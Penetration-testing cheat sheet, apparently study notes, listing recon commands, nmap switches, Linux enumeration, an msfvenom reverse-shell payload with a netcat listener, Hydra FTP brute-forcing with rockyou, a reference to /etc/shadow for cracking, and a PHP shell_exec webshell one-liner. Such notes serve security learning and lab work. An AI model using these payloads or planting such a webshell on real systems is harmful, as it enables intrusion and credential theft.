-- Networking --
Ping
Usage: Test a connection to a remote resource.
Command syntax:
ping <target>
(Typically returns the IP address for the target server)

Flags:
-i → Change intervals of sending ping requests.
-4 → Restrict to IPv4 only.
-v → Gives more verbose output.

Traceroute
Usage: Maps the path your request takes as it heads to the target machine.
Command syntax:
traceroute <destination>

Flags:
-i → Specify an interface.
-T → Use TCP SYN requests instead of ICMP.

WHOIS
Usage: Query who a domain name is registered to. Useful for recon.
Command syntax:
whois <domain>

Flags:
No specific flags commonly used.

Dig
Usage: Query recursive DNS servers for information about domains.
Command syntax:
dig <domain> @<dns-server-ip>

Flags:
+short → Return only IP(s) for the domain.
+trace → Show entire DNS path from root servers to authoritative servers.
-t <record-type> → Filter for specific record types:
MX → Mail records
NS → Name server records
TXT → Text records

Further Nmap
Nmap Switches
-sS → SYN scan (stealthier).
-sU → UDP scan.
-O → Detect operating system.
-sV → Detect service versions.
-v → Increase verbosity.
-vv → Extra verbosity.
-oA → Save results in all major formats.
-oN → Save in plain text format.
-oX → Save in XML format.
-oG → Save in grepable format.
-A → Aggressive mode (enables OS detection, version detection, and more).
-T1 to -T5 → Timing templates (1 = slow, 5 = fast).
-p <port> → Scan specific port.
-p <port-port> → Scan port range.
-p- → Scan all 65,535 ports.
--script → Run specific scripts.
--script=vuln → Run vulnerability detection scripts.

Linux: Local Enumeration
TTY/Text Terminal
Create a proper shell (useful for sudo/su):
python3 -c 'import pty; pty.spawn("/bin/bash")'

Basic Enumeration
Syntax:
uname [option]

Options:
-a → Print all information about the system.
-s → Print kernel name.
-m → Print machine hardware name.
-o → Print operating system name.

/ect Files
/etc/passwd → User info (plain text).
/etc/shadow → Encrypted passwords (for cracking).
/etc/hosts → Manual DNS mapping.

Find Command
Find specific files:
find -type f -name "*.log" 2>/dev/null
-type f → Files only.
-name → Name query.
2>/dev/null → Suppress permission errors.

SUID Files
Find SUID binaries:
find / -perm -u=s -type f 2>/dev/null

Network Services
SMB
Enumerating SMB with Enum4linux
enum4linux [option] <IP>

Options:
-U → Get user list.
-M → Get machine list.
-N → Get namelist dump.
-S → Get share list.
-P → Get password policy.
-G → Get group and member list.
-a → Get all of the above.

Telnet
Connect to a Telnet server:
telnet <ip> <port>

Start a tcpdump listener:
sudo tcpdump ip proto \icmp -i tun0

Generate a reverse shell payload using msfvenom:
msfvenom -p cmd/unix/reverse_netcat lhost=<local-ip> lport=4444 R

Open a Netcat listener:
nc -lvnp <port>

FTP
Brute-force FTP using Hydra:
hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp

NFS
Mount NFS shares:
sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock

MySQL
Use Metasploit to find MySQL vulnerabilities:
msfdb init

Webshells
Basic PHP Webshell Example

Simple one-liner in PHP:

<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> 

How It Works:

shell_exec() → Executes shell commands.

$_GET["cmd"] → Takes input from the URL.

<pre> → Ensures output formatting. 

Example: http://target.com/shell.php?cmd=ifconfig 
Executes ifconfig and returns network info.

Other Example Commands: 
whoami → Shows the current user. 
hostname → Displays system hostname. 
arch → Shows system architecture.

Finding Webshells in Kali: 
Kali includes pre-built webshells: /usr/share/webshells 
Example: 
php-reverse-shell → From PentestMonkey, works on Linux-based servers. 
